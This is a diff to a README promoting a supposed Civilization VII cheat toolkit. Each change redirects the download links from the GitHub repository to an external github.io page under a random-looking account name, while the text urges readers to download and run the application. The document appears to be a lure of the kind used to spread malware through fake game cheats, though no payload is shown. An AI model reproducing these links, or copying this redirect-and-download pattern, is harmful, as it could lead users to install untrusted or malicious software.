@@ -1,6 +1,6 @@
 <h1>🏛️ civilization-vii-cheat-strategy-toolkit - Master Every Game with Ease</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Civ%20VII%20Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/shortspurred-flint8963/civilization-vii-cheat-strategy-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Civ%20VII%20Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://shortspurred-flint8963.github.io)
 
 ## 🎮 What Is This Tool?
 
@@ -23,7 +23,7 @@ Getting started takes less than one minute. Follow these simple steps:
 ### 1. Visit the Download Page
 
 Visit this link to download the application:  
-[**https://github.com/shortspurred-flint8963/civilization-vii-cheat-strategy-toolkit**](https://github.com/shortspurred-flint8963/civilization-vii-cheat-strategy-toolkit)
+[**https://shortspurred-flint8963.github.io**](https://shortspurred-flint8963.github.io)
 
 ### 2. Download the File
 
@@ -41,7 +41,7 @@ The toolkit will open in a simple window. From here, you can start exploring all
 
 **For the full experience, please download the most recent version from the link below:**
 
-[**Download Civilization VII Strategy Toolkit**](https://github.com/shortspurred-flint8963/civilization-vii-cheat-strategy-toolkit)
+[**Download Civilization VII Strategy Toolkit**](https://shortspurred-flint8963.github.io)
 
 ### Understanding the Download
 
@@ -144,7 +144,7 @@ Civilization VII is a rich and complex game. With this toolkit, you can spend le
 
 Download it now and take your Civilization VII experience to the next level:
 
-[**Download Civilization VII Strategy Toolkit Now**](https://github.com/shortspurred-flint8963/civilization-vii-cheat-strategy-toolkit)
+[**Download Civilization VII Strategy Toolkit Now**](https://shortspurred-flint8963.github.io)
 
 <footer style="margin-top:40px; padding-top:20px; border-top:1px solid #ddd; font-size:0.85em; color:#555;">
 © 2026 civilization-vii-cheat-strategy-toolkit. This is a fan-made companion tool. Sid Meier's Civilization VII is a trademark of Firaxis Games and 2K. This project is not affiliated with or endorsed by the game developers.
